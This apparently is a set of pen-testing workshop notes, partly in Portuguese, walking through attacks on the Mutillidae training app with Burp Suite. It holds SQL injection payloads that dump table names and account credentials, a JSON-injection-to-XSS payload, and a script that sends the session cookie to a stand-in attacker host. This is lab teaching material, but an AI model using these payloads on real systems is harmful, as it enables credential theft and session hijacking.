@@ -1,0 +1,294 @@
+Pen Testing Web 2.0
+===================
+
+Agenda
+------
+. Web Storage
+. AJAX Transmission Formats
+. Demostration
+
+Web Storage
+-----------
+
+Web Storage
+ . Collection of simplistic cookie stored under "keys" ENTIRELY on the client machine
+ . Collection can tell you
+    . How many items are in storage
+	. If particular key already used
+ . Collection can
+    . Get, set and remove items until storage is full
+	. Ask for more storage
+	. Clear the collection
+
+. Types
+   . Local Storage
+   . Session Stoage
+
+. Good News
+   . Follow SAME-ORIGN restrictions
+   . User agent (should) limit the space allowed for storage
+   . Session storage is allowed to live session but IE and Firefox ignore this (thankfully)
+. Bad News
+   . DNS Spoofing, XSS, XSRF, Cross-Directory defeat SAME-ORIGIN
+   . No "HTTPOnly" or "Path" attribute available
+   . Developers think obscure means secure
+   . No concept of "sensitive"
+   . No data typing
+
+AJAX Transmission Formats
+. JavaScript Object Notation (JSON)
+   . Name/Value pairs which can be nested.
+   . The "value" of one pair could itself be a name/value pair.
+   . Value may be arrays
+. Extensible Markup Language (XML)
+   . SOAP is a "More specifc" form of XML
+. Proprietary Formats
+   . Comma delimited list
+   . Crazy stuff utter insanity
+
+Demostration
+. Reading Web Storage
+. Stealing web storage
+. Code injection via "normal" data
+. Code injection via JSON data
+
+Utilize o Burp Suite para fazer o proxy do browser a ser utilizado.
+
+[ Attacker] --> [ Burp] --> [Web Server]
+
+owasp web penetration tasting
+
+Leason -> Pen Test Tool Lookup
+
+OWASP TOP 10 -> A1 - Other Injection -> JavaScript Object Nation (JSON) Injection -> Pen Test Tool Lookup AJAX
+
+vamos olhar o código fonte - procurar por xmlhttp
+HMLHttpRequest();
+
+
+Request -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13
+
+
+<-- Response
+HTTP/1.1 200 OK
+Rest HEAD
+
+{ "query": {"toolIDRequest" : "13", "penTestTools" : [{"tool_id":"13","tool_name":"GreaseMonkey","phase_to_use":"Discovery","tool_type":"Browser Manipulation Tool", "comment":"Firefox add-on. Allows the user to inject JavaScripts and change page."}]}}
+
+
+Request (change) -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13 --
+
+<-- Response
+HTTP/1.1 200 OK
+Rest HEAD
+
+{ "query": {"toolIDRequest" : "13", "penTestTools" : [{"tool_id":"13","tool_name":"GreaseMonkey","phase_to_use":"Discovery","tool_type":"Browser Manipulation Tool", "comment":"Firefox add-on. Allows the user to inject JavaScripts and change page."}]}}
+
+No problem injected --
+
+
+Request (change) -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13'
+
+<-- Response
+HTTP/1.1 200 OK
+Rest HEAD
+
+C:\xampp\htdocs\multillidae\classes\MySQLHandler.php on 254: ...: Error executing query: You have an erro in you SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''13''' at line 2 () (0) [Exception] <br />
+	SELECT tool_id, tool_namje, phase_to_use, tool_type, comment
+		FROM pen_test_tools WHERE tool_id = '13''; (0) [Exception] <br />
+
+{ "query": {"toolIDRequest" : "13'", "penTestTools" : []}}
+
+Ohhhhhh injected '
+
+
+Request -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13
+
+clique com o botão direito na tela de intercept e aponte para send to repeater. 
+clique em forward
+e vai para a guia Repeater
+
+Agora é só mudar em request e clicar no botão GO e ver a resposta em response
+
+Obsever que na resposta a consulta está fechada com ; <---------+
+<-- Response                                                    |
+HTTP/1.1 200 OK                                                 |
+Rest HEAD                                                       |
+                                                                |
+C:\xampp\htdocs\multillidae\classes\MySQLHandler.php on 254: ...: Error executing query: You have an erro in you SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''13''' at line 2 () (0) [Exception] <br />                                               |
+	SELECT tool_id, tool_namje, phase_to_use, tool_type, comment |
+		FROM pen_test_tools WHERE tool_id = '13''; <-------------+ (0) [Exception] <br />
+
+{ "query": {"toolIDRequest" : "13'", "penTestTools" : []}}
+
+Request (change) -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13' union select table_name information_schema.tables --
+
+voltou um exception
+
+Request (change) -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13' union select table_name,null information_schema.tables --
+
+ToolID:13' union select table_name,null,null,null,null information_schema.tables --
+
+Retornou dados
+
+ToolID:13' union select table_schema,table_name,null,null,null information_schema.tables --
+
+Depois copiamos o payload e interceptamos novamente a mesma requisição e injetamos o payload que retornou dados para vermos de forma formatada na página.
+
+
+outros injection
+
+ToolID:13' union select 1,2,3,4,5 from information_schema.tables --
+
+Olhando nas respostas temos tabelas como account, user e cred_cards
+
+ToolID:13' union select column_name,null,null,null,null from information_schema.columns where table_name="accounts" --
+
+ToolID:13' union select username,passwordcolumn_name,null,null,null from nowasp.accounts --
+
+
+
+Observação o número de null é o número de colunas que retornaram em branco no formulário web. Como na resposta original temos 5 colunas devemos sempre contar as colunas que não retornará nada e colocar no lugar null.
+
+
+------------------------------------------------------------------------------------------------------------------------
+
+Web Pen-Test Workshop - JSON Injection
+======================================
+
+Request -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13
+
+
+<-- Response
+HTTP/1.1 200 OK
+Rest HEAD
+
+{ "query": {"toolIDRequest" : "13", "penTestTools" : [{"tool_id":"13","tool_name":"GreaseMonkey","phase_to_use":"Discovery","tool_type":"Browser Manipulation Tool", "comment":"Firefox add-on. Allows the user to inject JavaScripts and change page."}]}}
+
+
+
+Request (change) -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13CANARY
+
+
+<-- Response
+HTTP/1.1 200 OK
+Rest HEAD
+
+{ "query": {"toolIDRequest" : "13CANARY", "penTestTools" : [{"tool_id":"13","tool_name":"GreaseMonkey","phase_to_use":"Discovery","tool_type":"Browser Manipulation Tool", "comment":"Firefox add-on. Allows the user to inject JavaScripts and change page."}]}}
+
+Ele retornou com a alteração 13CANARY em toolIDRequest.
+
+vamos olhar o código fonte, procure por CANARY
+
+Observe que ele faz párte de uma variável 
+ var gPenTestToolsJSON = { {"query": {"toolIDRequested": "13"....}} };
+
+vamos copiar a resposta para podemos injetar HTML ou JavaScript (XSS)
+
+{ "query": {"toolIDRequest" : " <-- essa é a parte que nos enterssa, pois foi aqui que conseguinmos injetar
+{ "query": {"toolIDRequest" : " "}} }<-- aqui devemos fechar a resposta, inclusive a da variável externa.
+;alert(0);// <-- aqui estamos fechando a ultima requisição, inseerindo uma mensagem e comentando o restante do código
+
+13CANARY", "penTestTools" : [{"tool_id":"13","tool_name":"GreaseMonkey","phase_to_use":"Discovery","tool_type":"Browser Manipulation Tool", "comment":"Firefox add-on. Allows the user to inject JavaScripts and change page."}]}}
+
+{ "query": {"toolIDRequest" : " <-- essa é a parte que nos enterssa, pois foi aqui que conseguinmos injetar
+{ "query": {"toolIDRequest" : " "}} <-- aqui devemos fechar a resposta.
+;alert(0);// <-- aqui estamos fechando a ultima requisição, inseerindo uma mensagem e comentando o restante do código
+
+13CANARY", "penTestTools" : [{"tool_id":"13","tool_name":"GreaseMonkey","phase_to_use":"Discovery","tool_type":"Browser Manipulation Tool", "comment":"Firefox add-on. Allows the user to inject JavaScripts and change page."}]}}
+
+Com isso vamos montar no envio o payload que montamos:
+
+Request (change) -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13"}} };alert(0);//
+
+Copie a parte inserida vá para a guia Decoder e faça o encode URL
+Copie o resultado encodado e injete na requisição
+
+Request (change) -->
+POST /mult... HTTP/1.1
+Rest of HEAD
+
+ToolID:13%22%7d%3b...%2f%2f
+
+envie
+
+<-- Response
+HTTP/1.1 200 OK
+Rest HEAD
+
+{ "query": {"toolIDRequest" : "13"}} };alert(0);//", "penTestTools" : [{"tool_id":"13","tool_name":"GreaseMonkey","phase_to_use":"Discovery","tool_type":"Browser Manipulation Tool", "comment":"Firefox add-on. Allows the user to inject JavaScripts and change page."}]}}
+
+olhe no código fonte a variável gPenTestToolsJSON
+
+outra forma é copiando toda a variável
+
+16", penTestTools:[{"tool_id":"13","tool_name":"GreaseMonkey","phase_to_use":"Discovery","tool_type":"Browser Manipulation Tool", "comment":"Firefox add-on. Allows the user to inject JavaScripts and change page."}]}} }; try{`var lAction = 'http://site-attacker.com/capture-data.php?cookie=' + document.cookie;lXMLHTTP = new lXMLHTTPRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMHTTP.send(""); }catch(e){};//
+
+Enviando o cookie de sessão para o site do atacante
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
